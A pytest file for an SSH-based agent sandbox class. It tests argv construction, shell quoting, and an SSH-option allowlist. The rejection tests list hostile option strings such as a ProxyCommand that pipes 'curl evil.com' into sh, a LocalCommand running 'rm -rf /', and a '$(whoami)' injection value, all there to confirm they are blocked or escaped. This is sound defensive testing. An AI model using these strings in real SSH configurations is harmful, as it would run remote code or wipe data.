"""Tests for :class:`~strands.sandbox.ssh.SshSandbox`.

Mirrors ``strands-ts/src/sandbox/__tests__/ssh.test.node.ts``. These tests assert
the ``ssh`` argv the sandbox builds and the SSH-option allowlist; the process
pump (``_stream_process``) is mocked, so no remote host is required.

The remote command strings use stdlib ``shlex.quote`` (the core port's choice
over the oracle's hand-rolled ``shellQuote``). The two render shell-equivalent
output, but differ byte-for-byte: ``shlex.quote`` only adds quotes when a value
contains shell-special characters, so e.g. ``cd /w`` here vs ``cd '/w'`` in the
oracle. Expectations below assert the ``shlex`` form.
"""

import unittest.mock

import pytest

from strands.sandbox.ssh import SshSandbox
from strands.sandbox.types import ExecutionResult
from strands.vended_tools.shell.types import SANDBOX_SHELL_DESCRIPTION

# Leading SSH flags shared by every invocation, with default host-key checking.
BASE = ["-o", "StrictHostKeyChecking=accept-new", "-o", "BatchMode=yes", "-p", "22"]


@pytest.fixture
def mock_stream_process(agenerator):
    """Patch ``_stream_process`` in the ssh module, returning a no-op result."""
    with unittest.mock.patch("strands.sandbox.ssh._stream_process") as mock:
        mock.return_value = agenerator([ExecutionResult(exit_code=0, stdout="", stderr="")])
        yield mock


def _args(mock_stream_process) -> list[str]:
    """The argv passed to ``_stream_process`` (its second positional argument)."""
    return mock_stream_process.call_args.args[1]


# ---- constructor ----


def test_stores_host_and_working_dir():
    sandbox = SshSandbox("myhost", working_dir="/workspace")
    assert sandbox.host == "myhost"
    assert sandbox.working_dir == "/workspace"


# ---- SSH option allowlist ----


def test_permits_known_safe_options():
    SshSandbox("h", working_dir="/w", ssh_options=["ConnectTimeout=10", "ServerAliveInterval=60", "Compression=yes"])


@pytest.mark.parametrize(
    "option",
    [
        "ProxyCommand=curl evil.com | sh",
        "Include=/tmp/evil.conf",
        'Match exec "curl evil.com"',
        "LocalCommand=rm -rf /",
        "LocalForward=8080:localhost:80",
        "RemoteForward=9090:internal:80",
        "DynamicForward=1080",
    ],
)
def test_rejects_unsafe_options(option):
    with pytest.raises(ValueError, match="not allowed"):
        SshSandbox("h", working_dir="/w", ssh_options=[option])


@pytest.mark.parametrize("option", ["proxycommand=evil", "PROXYCOMMAND=evil"])
def test_allowlist_is_case_insensitive(option):
    with pytest.raises(ValueError, match="not allowed"):
        SshSandbox("h", working_dir="/w", ssh_options=[option])


def test_allow_unsafe_ssh_options_bypasses_validation():
    SshSandbox("h", working_dir="/w", ssh_options=["ProxyCommand=anything"], allow_unsafe_ssh_options=True)


# ---- argv construction ----


@pytest.mark.asyncio
async def test_builds_default_args(mock_stream_process):
    await SshSandbox("user@server.com", working_dir="/remote/path").execute("echo hi")
    assert _args(mock_stream_process) == BASE + ["--", "user@server.com", "cd /remote/path && echo hi"]


@pytest.mark.asyncio
async def test_allow_unknown_hosts_disables_strict_checking(mock_stream_process):
    await SshSandbox("h", working_dir="/w", allow_unknown_hosts=True).execute("ls")
    assert _args(mock_stream_process) == [
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "BatchMode=yes",
        "-p",
        "22",
        "--",
        "h",
        "cd /w && ls",
    ]


@pytest.mark.asyncio
async def test_includes_identity_file(mock_stream_process):
    await SshSandbox("h", working_dir="/w", identity_file="/home/user/.ssh/key").execute("ls")
    assert _args(mock_stream_process) == BASE + ["-i", "/home/user/.ssh/key", "--", "h", "cd /w && ls"]


@pytest.mark.asyncio
async def test_uses_custom_port(mock_stream_process):
    await SshSandbox("h", working_dir="/w", port=2222).execute("ls")
    assert _args(mock_stream_process) == [
        "-o",
        "StrictHostKeyChecking=accept-new",
        "-o",
        "BatchMode=yes",
        "-p",
        "2222",
        "--",
        "h",
        "cd /w && ls",
    ]


@pytest.mark.asyncio
async def test_appends_user_ssh_options(mock_stream_process):
    await SshSandbox("h", working_dir="/w", ssh_options=["ConnectTimeout=5", "ServerAliveInterval=30"]).execute("ls")
    assert _args(mock_stream_process) == BASE + [
        "-o",
        "ConnectTimeout=5",
        "-o",
        "ServerAliveInterval=30",
        "--",
        "h",
        "cd /w && ls",
    ]


@pytest.mark.asyncio
async def test_quotes_cwd_with_special_characters(mock_stream_process):
    # A path with spaces and an embedded single quote exercises the shlex escaping path:
    # shlex closes the quote, inserts an escaped quote ('"'"'), and reopens.
    await SshSandbox("h", working_dir="/path/with spaces/and'quotes").execute("ls")
    assert _args(mock_stream_process) == BASE + [
        "--",
        "h",
        "cd '/path/with spaces/and'\"'\"'quotes' && ls",
    ]


@pytest.mark.asyncio
async def test_uses_cwd_option_when_provided(mock_stream_process):
    await SshSandbox("h", working_dir="/default").execute("ls", cwd="/override")
    assert _args(mock_stream_process) == BASE + ["--", "h", "cd /override && ls"]


@pytest.mark.asyncio
async def test_prefixes_command_with_env_vars(mock_stream_process):
    await SshSandbox("h", working_dir="/w").execute("echo $FOO", env={"FOO": "bar", "BAZ": "qux"})
    assert _args(mock_stream_process) == BASE + ["--", "h", "cd /w && export FOO=bar BAZ=qux && echo $FOO"]


@pytest.mark.asyncio
async def test_quotes_env_values_with_metacharacters(mock_stream_process):
    # An env value containing shell metacharacters must be quoted so it reaches the
    # remote shell literally, never expanded.
    await SshSandbox("h", working_dir="/w").execute("echo $FOO", env={"FOO": "$(whoami)"})
    assert _args(mock_stream_process) == BASE + ["--", "h", "cd /w && export FOO='$(whoami)' && echo $FOO"]


@pytest.mark.asyncio
async def test_forwards_timeout_and_enoent_message(mock_stream_process):
    await SshSandbox("h", working_dir="/w").execute("ls", timeout=5)
    assert mock_stream_process.call_args.kwargs == {
        "timeout": 5,
        "enoent_message": "ssh is not installed or not on PATH",
    }


@pytest.mark.asyncio
async def test_rejects_invalid_env_var_names(mock_stream_process):
    with pytest.raises(ValueError, match="Invalid environment variable name"):
        await SshSandbox("h", working_dir="/w").execute("cmd", env={"FOO=bar BAZ": "val"})


def test_get_tools_vends_file_editor_and_shell():
    tools = SshSandbox("myhost", working_dir="/workspace").get_tools()
    assert [t.tool_name for t in tools] == ["sandbox_file_editor", "sandbox_shell"]


def test_get_tools_shell_description_names_host():
    tools = SshSandbox("myhost", working_dir="/workspace").get_tools()
    shell_tool = next(t for t in tools if t.tool_name == "sandbox_shell")
    assert SANDBOX_SHELL_DESCRIPTION in shell_tool.tool_spec["description"]
    assert "myhost" in shell_tool.tool_spec["description"]
